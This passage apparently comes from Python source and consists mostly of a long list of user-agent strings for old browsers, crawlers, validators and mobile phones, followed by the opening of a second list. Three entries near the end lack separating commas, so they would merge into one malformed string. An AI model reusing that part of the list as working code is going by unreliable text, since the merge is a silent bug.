			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/85.8",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3",
			"Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (MeeGo; NokiaN950-00/00) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
			"Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
			"Mozilla/5.0 (PLAYSTATION 3; 1.10)",
			"Mozilla/5.0 (PLAYSTATION 3; 2.00)",
			"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC7-00/012.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE6-00/021.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.16 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es50",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0",
			"Mozilla/5.0 (SymbianOS 9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
			"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
			"Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 SonyEricssonP100/01; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525",
			"Mozilla/5.0 (Unknown; U; UNIX BSD/SYSV system; C -) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.2",
			"Mozilla/5.0 (webOS/1.3; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Desktop/1.0",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
			"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
			"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
			"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
			"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
			"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
			"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
			"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
			"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
			"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
			"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
			"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
			"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
			"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
			"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
			"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
			"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
			"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
			"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
			"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
			"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
			"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
			"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
			"MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23",
			"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
			"msnbot/1.0 ( http://search.msn.com/msnbot.htm)",
			"msnbot/1.1 ( http://search.msn.com/msnbot.htm)",
			"msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)",
			"NetSurf/1.2 (NetBSD; amd64)",
			"Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
			"Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
			"NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1",
			"nook browser/1.0",
			"Offline Explorer/2.5",
			"Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
			"Opera/7.50 (Windows ME; U) [en]",
			"Opera/7.50 (Windows XP; U)",
			"Opera/7.51 (Windows NT 5.1; U) [en]",
			"Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)",
			"Opera/9.0 (Macintosh; PPC Mac OS X; U; en)",
			"Opera/9.20 (Macintosh; Intel Mac OS X; U; en)",
			"Opera/9.25 (Windows NT 6.0; U; en)",
			"Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)",
			"Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)",
			"Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.1.11320/608; U; en) Presto/2.2.0",
			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14320/554; U; cs) Presto/2.2.0",
			"Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1",
			"Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
			"Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
			"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
			"Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
			"Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
			"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
			"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
			"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
			"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
			"Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
			"Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
			"P3P Validator",
			"Peach/1.01 (Ubuntu 8.04 LTS; U; en)",
                        "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)"
                        "msnbot/2.0b (+http://search.msn.com/msnbot.htm)"
                        "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
			"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
			"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
			"portalmmm/2.0 N410i(c20;TB) ",
			"Python-urllib/2.5",
			"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
			"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"SearchExpress",
			"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
			"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
			"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
			"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonT100/R101",
			"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
			"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonT68/R201A",
			"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
			"SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
			"SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"SuperBot/4.4.0.60 (Windows XP)",
			"Uzbl (Webkit 1.3) (Linux i686 [i686])",
			"Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1",
			"W3C_Validator/1.305.2.12 libwww-perl/5.64",
			"W3C_Validator/1.654",
			"w3m/0.5.1",
			"WDG_Validator/1.6.2",
			"WebCopier v4.6",
			"Web Downloader/6.9",
			"WebZIP/3.5 (http://www.spidersoft.com)",
			"Wget/1.9.1",
			"Wget/1.9 cvs-stable (Red Hat modified)",
			"wii libnup/1.0",
			]

useragentsi=["AdsBot-Google ( http://www.google.com/adsbot.html)",
